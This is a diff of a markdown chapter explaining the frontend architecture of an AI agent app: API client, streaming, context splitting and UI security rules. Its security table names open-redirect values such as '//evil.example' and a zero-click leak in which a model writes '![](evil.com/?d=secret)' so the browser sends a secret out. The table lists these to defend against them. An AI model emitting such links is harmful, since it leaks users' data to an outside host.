@@ -14,15 +14,15 @@
 ```mermaid
 flowchart TB
     subgraph Pages["pages/ (routes, lazy-loaded)"]
-      P1[AIChat] --- P2[AgentBuilder] --- P3[Runs] --- P4[Apps / Files]
+      P1[features/chat/] --- P2[AgentBuilder] --- P3[Runs] --- P4[Apps / Files]
     end
-    subgraph Components["components/ (drawing)"]
-      C1[chat/] --- C2[plan/] --- C3[apps/] --- C4[ui/]
+    subgraph Components["components/ + features/chat/components/ (drawing)"]
+      C1[features/chat/components] --- C2[apps/] --- C3[ui/]
     end
-    subgraph Hooks["hooks/ (state + effects)"]
+    subgraph Hooks["hooks/ + features/chat/hooks/ (state + effects)"]
       H1[useChatStream] --- H2[usePlanStream] --- H3[useSocket] --- H4[useRecents]
     end
-    subgraph Lib["lib/ (pure logic, no React)"]
+    subgraph Lib["lib/ + features/chat/lib/ (pure logic, no React)"]
       L1[cron] --- L2[commands] --- L3[planView] --- L4[chatRuns] --- L5[nextPath / safeUrl]
     end
     subgraph Api["api/ (transport)"]
@@ -85,7 +85,7 @@ One `axios` instance for the whole app. Interceptors wrap every request and
 response — the frontend version of backend middleware.
 
 ```ts
-const apiClient = axios.create({ baseURL: '/api', timeout: 300000 });
+const apiClient = axios.create({ baseURL: API_URL, timeout: 300000 });
 
 // Request: attach the token
 apiClient.interceptors.request.use((config) => {
@@ -114,7 +114,7 @@ apiClient.interceptors.response.use(r => r, async (error) => {
     }
     original._retry = true;          // never loop: one retry per request
     isRefreshing = true;
-    const { access, refresh } = (await axios.post('/api/auth/refresh/', {...})).data;
+    const { access, refresh } = (await axios.post('/api/auth/token/refresh/', {...})).data;
     tokenManager.setTokens(access, refresh || refreshToken);
     processQueue(null, access);      // release everyone waiting
     return apiClient(original);
@@ -214,8 +214,7 @@ export interface Listing<T> { items: T[]; count: number; }   // count = "is this
 
 `apiErrorMessage(err, fallback)` does the same for errors. Every call site had
 its own `err.response?.data?.error || err.message`, they drifted, and none read
-DRF's field-error shape `{"cron": ["Expected five cron fields."]}`. Now one
-function narrows `unknown` and every caller stays type-safe.
+DRF's field-error shape `{"cron": ["Expected five cron fields."]}`. Now `apiErrorMessage` narrows `unknown`; one copy still lives in `components/tools/CustomTools.tsx`.
 
 **The general rule:** *types are a claim; the boundary is where you check it.*
 
@@ -319,7 +318,7 @@ flowchart LR
     S --> UI[screen]
 ```
 
-[`hooks/useChatStream.ts:200`](../better-n8n-frontend/src/hooks/useChatStream.ts#L200)
+[`features/chat/hooks/useChatStream.ts`](../better-n8n-frontend/src/features/chat/hooks/useChatStream.ts)
 
 A streamed answer is a list of events. The screen is a **fold** over them.
 
@@ -422,12 +421,10 @@ transcript.
 
 ```mermaid
 flowchart TB
-    P[OSProvider] --> A["OSActionsContext<br/>openApp, notify: never changes"]
-    P --> W[windows state]
-    P --> N[notifications state]
-    P --> S[shell state]
-    A --> Most["most apps: never re-render<br/>on a new notification"]
-    N --> Bell[notification bell only]
+    P[Provider] --> A["actions context<br/>never changes identity"]
+    P --> S1["state context<br/>changes often"]
+    P --> S2["state context<br/>changes rarely"]
+    A --> Most["components that only call actions<br/>never re-render on a state change"]
 ```
 
 [`contexts/themeState.ts`](../better-n8n-frontend/src/contexts/themeState.ts)
@@ -451,10 +448,10 @@ Three small decisions:
    `ThemeContext.tsx`.** A file exporting both a component and plain values
    opts out of Vite's fast refresh, so editing the provider would remount the
    app and drop state. (Same split for auth, assistant, imagine, and toasts.)
-3. **Split contexts by how often they change.** BrowserOS's `OSProvider`
-   publishes *five* contexts: one with only stable actions (never changes
-   identity) and four with state that changes at different rates. Components
-   that only call `openApp()` never re-render when a notification arrives.
+3. **Split contexts by how often they change.** A provider can publish
+   several contexts: one with only stable actions (never changes identity)
+   and others with state that changes at different rates. Components that
+   only call an action never re-render when unrelated state changes.
    This is **Interface Segregation for React context**.
 
 **Interview line:** "Context re-renders every consumer when its value changes,
@@ -584,13 +581,13 @@ flowchart TB
     SC --> API[API calls]
 ```
 
-`components/chat/StandaloneChat.tsx` **owns** the chat page's state and
+`features/chat/components/StandaloneChat.tsx` **owns** the chat page's state and
 handlers. The drawing is split into props-only pieces: `ChatHistorySidebar`,
 `ChatHeader`, `ChatSettingsDialog`, `ChatMessageItem`, `ToolApprovalCard`.
 
 Rules for the pieces:
 - No hooks that fetch, no API calls. Every action is a **callback prop**.
-- `components/chat/__tests__/chatPieces.test.tsx` pins the **arguments each
+- `features/chat/components/__tests__/chatPieces.test.tsx` pins the **arguments each
   callback receives** — that's the contract between container and piece.
 
 Why: a 2,000-line page component can't be tested or reviewed. Pure pieces can
@@ -643,7 +640,7 @@ flowchart LR
     end
 ```
 
-`components/chat/ThinkingTimer.tsx` owns a 10 Hz interval. When the interval
+`features/chat/components/ThinkingTimer.tsx` owns a 10 Hz interval. When the interval
 lived in the chat page, every tick re-rendered the whole transcript and re-parsed
 every message's markdown. `MarkdownMessage` is also wrapped in `memo`
 (`export default memo(MarkdownMessage)`).
@@ -773,7 +770,7 @@ compile time.
 ```mermaid
 flowchart TD
     U["URL from ?next= or a model"] --> K{which check?}
-    K -- "?next=" --> N{"starts with a single / and no backslash?"}
+    K -- "?next=" --> N{"starts with a single / and not a second / or a backslash?"}
     N -- yes --> Go[navigate in app]
     N -- no --> Home[go to default landing]
     K -- "external link" --> S{"protocol http: or https:?"}
@@ -788,7 +785,7 @@ flowchart TD
 | **Only same-origin paths for `?next=`** | [`lib/nextPath.ts`](../better-n8n-frontend/src/lib/nextPath.ts) | Open redirect after sign-in (`//evil.example`, `javascript:`, `/\evil`) |
 | **Only `http:`/`https:` URLs open** | [`lib/safeUrl.ts`](../better-n8n-frontend/src/lib/safeUrl.ts) | `javascript:` / `data:` / `blob:` links chosen by a model or web page |
 | **Remote images render as links, not `<img>`** | `MarkdownMessage` | Zero-click data leak: a model writes `![](evil.com/?d=secret)` and the browser fetches it on render |
-| **Previews in sandboxed iframes with a no-network CSP** | `FilePreview`, `HtmlArtifact` | A shared HTML file running script with this app's origin |
+| **Previews in sandboxed iframes with a no-network CSP** | `FilePreview`, `PublishedPageView` | A shared HTML file running script with this app's origin |
 | **Notification `data` is not rendered** | `NotificationsTab` | Leaking ids and raw tool arguments; only `action_url` (allow-listed) and `pending_count` are shown |
 | **Tool calls shown as a server-written sentence, raw args behind a disclosure** | `ToolApprovalCard` | Third-party text styling the screen that asks for your approval |
 
@@ -823,7 +820,7 @@ flowchart LR
 ```
 
 Some rules exist twice: once in Python, once in TypeScript. Drift between them
-shows up as UI flicker or wrong labels. Three techniques used here:
+shows up as UI flicker or wrong labels. Two techniques used here:
 
 1. **Shared golden tables.** The cron description ("Every weekday at 09:00") is
    computed by `lib/cron.ts::describe` while typing and replaced ~350 ms later by
@@ -835,9 +832,6 @@ shows up as UI flicker or wrong labels. Three techniques used here:
    categories come from the backend; the frontend maps only `icon_slug` → an
    icon component (because an icon can't be serialised). Never key presentation
    off a display name.
-3. **Resolve every client path against the URL conf.** A check walks every
-   `apiClient` path and matches it to a Django route — it catches dead wiring
-   that both `tsc` and `pytest` miss.
 
 **Interview line:** "When the same rule lives in two languages, I pin both to one
 table of expected outputs, so a change on one side fails the other side's test."
@@ -886,40 +880,6 @@ flowchart TB
 
 ---
 
-### 11.11 Classic frontend LLD interview questions, answered from this code
-
-**Q: Design an autocomplete / command palette.**
-Keyboard model (up/down/enter/escape), ranking in a pure function
-(`lib/commands.ts` ranks and parses — vitest-covered), a catalogue loaded once
-(`useCommands`), 44 px rows for touch, a sheet on phones. The backend validates
-the command, so the client never has to be trusted.
-
-**Q: Design an infinite list / feed.**
-Server returns `{items, count}` so the UI can say "showing 20 of 312";
-keyset (not offset) pagination for stable pages (learning/10); React Query keys
-per filter; never silently drop rows.
-
-**Q: Design a real-time chat UI.**
-Optimistic user bubble with a client id; SSE for the answer; pure reducer over
-frames; external run store so navigation doesn't lose it; steering while busy
-(the send button queues a steer when there's text, stops when empty); take the
-optimistic bubble back out if the server refuses the message (`code:
-SECURITY_VIOLATION`).
-
-**Q: Design undo/redo for an editor.**
-Two stacks, coalesce bursts, cap size, clear redo on a new edit, keep stacks in
-refs and only depth in state (§11.5).
-
-**Q: How would you handle token refresh with many concurrent requests?**
-Single-flight refresh with a waiting queue and a one-retry flag (§11.1.1).
-
-**Q: How do you stop a big React page from being slow?**
-Split by route; lazy-load heavy editors; memo expensive leaves; isolate
-fast-changing state into leaf components; split context by rate of change;
-batch stream updates.
-
----
-
 ### 11.12 Frontend cheat sheet
 
 | Pattern | Where | One line |
@@ -928,13 +888,12 @@ batch stream updates.
 | Single-flight + queue | `api/client.ts` | One refresh, many waiters |
 | Streaming parser | `api/sse.ts` | Buffer the partial line |
 | Anti-corruption layer | `api/unwrap.ts`, `lib/apiError.ts` | Normalise where data enters |
-| Reducer / event sourcing | `hooks/useChatStream.ts` | Screen = fold over events |
+| Reducer / event sourcing | `features/chat/hooks/useChatStream.ts` | Screen = fold over events |
 | Observable store + replay | `lib/chatRuns.ts` | State that outlives components |
-| Context split by change rate | `contexts/*State.ts`, BrowserOS `osState.ts` | Stable actions, separate state |
 | Facade over a store | `lib/toastStore.ts` | `toast.success(...)` |
 | Adapter over storage | `hooks/usePersistedState.ts` | Durable UI state that never throws |
 | Resource hook | `lib/websocket.ts` | Backoff, race guard, latest-callbacks ref |
-| Container / presentational | `components/chat/*` | State in one owner, pieces take props |
+| Container / presentational | `features/chat/components/*` | State in one owner, pieces take props |
 | IoC via context | `components/apps/SaveContext.tsx` | Editors register `save()` |
 | Memento / two-stack undo | `lib/history.ts` | Coalesce, cap, clear redo |
 | Code splitting | `App.tsx` `lazyPage` | Eager auth, lazy everything else |
@@ -944,35 +903,15 @@ batch stream updates.
 
 ---
 
-### 11.13 Recent additions (2026-09-28): showing users the real state
+### 11.13 Showing users the real state
 
-The organisations and solution-memory feature (Part 1 §3.3) added three
-screens. They follow patterns already in this chapter, plus one new rule worth
-naming: **show people what the system actually does, not what they assume.**
-
-```mermaid
-flowchart LR
-    subgraph Settings
-        O["Organisation tab<br/>members, active org"]
-        M["Memory tab<br/>marks facts the model isn't shown"]
-    end
-    subgraph Chat
-        H["ChatHeader badge<br/>Sharing with Acme / Private"]
-        D["ChatSettingsDialog<br/>share_solutions switch"]
-    end
-    S["/solutions page<br/>read, confirm, flag, remove"]
-    O --> API[api/orgs.ts]
-    S --> API2[api/solutions.ts]
-    M --> API3[api/memory.ts]
-    H --> API4[api/chat.ts]
-    D --> API4
-```
+The rule: **show people what the system actually does, not what they
+assume.** Three places it lands:
 
 **1. The Memory tab shows what the model can't see.** The backend returns
-`in_prompt` for each stored fact, computed by the *same* selection that builds
-the prompt (Part 2 §8.11). The tab greys out facts with `in_prompt: false`, so
-"I told it this and it forgot" becomes visible instead of mysterious. The check
-is written defensively:
+`in_prompt` per fact, computed by the *same* selection that builds the
+prompt (Part 2 §8.11); the tab greys out `in_prompt: false`. Absent and
+false are different values:
 
 ```ts
 export function isHidden(memory: UserMemory): boolean {
@@ -980,9 +919,11 @@ export function isHidden(memory: UserMemory): boolean {
 }
 ```
 
-An older server sends no field at all, and `undefined` must not be read as
-"hidden". This is §T6's rule (`??` and `===` vs truthiness) applied: **absent
-and false are different values.**
+**2. The Organisation tab and `/solutions` page** render membership roles,
+per-org sharing and the library from the org APIs — no local re-derivation.
+
+**3. The share pill** shows "Sharing with <org> / Private" from the server's
+own share decision for the chat, not from the user's memory of toggling it.
 
 **2. The chat header says where a solution would go.** A badge reads
 "Sharing with ⟨org⟩" or "Private", and the settings dialog has a switch
